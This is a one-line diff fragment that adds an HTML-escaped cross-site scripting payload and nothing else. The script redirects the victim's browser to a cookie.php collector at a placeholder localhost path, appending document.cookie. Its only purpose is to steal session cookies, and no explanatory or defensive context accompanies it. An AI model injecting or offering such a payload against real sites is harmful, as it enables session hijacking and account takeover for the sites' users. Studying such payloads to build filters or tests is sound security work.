@@ -1,0 +1,1 @@
+&lt;script&gt;document.location =&quot;http://localhost/[path]/cookie.php?cookie=&quot; + document.cookie;&lt;/script&gt;
